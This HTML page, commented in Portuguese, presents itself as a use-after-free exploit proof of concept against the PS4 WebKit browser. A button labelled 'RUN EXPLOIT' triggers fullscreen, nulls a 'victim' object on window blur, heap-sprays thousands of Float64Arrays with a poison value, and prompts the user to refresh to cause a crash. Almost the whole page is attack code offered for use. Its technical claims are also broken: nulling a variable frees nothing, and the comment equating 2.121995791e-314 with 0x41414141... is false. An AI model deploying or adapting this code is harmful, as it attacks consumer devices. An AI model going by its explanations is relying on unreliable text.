<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Webkit (PoC CE-36329-3)</title>

</head>
<body>

<h1>Teardown Webkit Crash</h1>

<div class="status" id="msg">
    INSTRUÇÕES PARA O CRASH (CE-36329-3):<br><br>
    1. CLIQUE NO BOTÃO ABAIXO.<br>
    2. APERTE "OPTIONS" (MENU LATERAL).<br>
    3. SELECIONE "ATUALIZAR" (REFRESH).
</div>

<button onclick="fire()">RUN EXPLOIT (UAF POISON)</button>

<div id="log">Sistema pronto. Aguardando gatilho...</div>

<script>
    const Msg = document.getElementById('msg');
    
    // Armazenamento global para garantir persistência na memória
    let spray_storage = [];
    let victim = { 
        id: "VICTIM_OBJECT", 
        data: new Array(100).fill(1.1),
        ptr: { a: 1 } 
    };

    function fire() {
        
        
        // Solicita Fullscreen
        const doc = document.documentElement;
        if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
        else if (doc.requestFullscreen) doc.requestFullscreen();

        // A ARMADILHA (Gatilho: Perda de Foco/Menu Options)
        window.onblur = function() {
            console.log("Blur detectado! Executando payload...");
            
            // 1. FREE (Libera o objeto vítima)
            victim = null;
            
            // 2. USE / SPRAY (Ocupa o lugar da vítima com veneno)
            // Criamos milhares de arrays de Float64.
            // O valor 2.122e-314 (em binário) se parece muito com 0x4141414141414141
            // Isso é o padrão "AAAA" usado por hackers para marcar crashes.
            try {
                for(let i=0; i<10000; i++) {
                    const poison = new Float64Array(32);
                    poison.fill(2.121995791e-314); // 0x41414141...
                    spray_storage.push(poison);
                }
            } catch(e) {}
            
            // 3. ACCESS ATTEMPT (Prepara o terreno para o Refresh)
            // Criamos uma referência circular ou complexa que o Refresh vai tentar limpar
            // e acabar caindo no nosso spray 0x41414141
            window.exploit_trigger = spray_storage;
            
            document.body.style.background = "#fff"; // Flash visual
            Msg.innerText = ">>> AGORA: CLIQUE EM ATUALIZAR! <<<";
            Msg.style.color = "black";
        };
    }
</script>
</body>
</html>


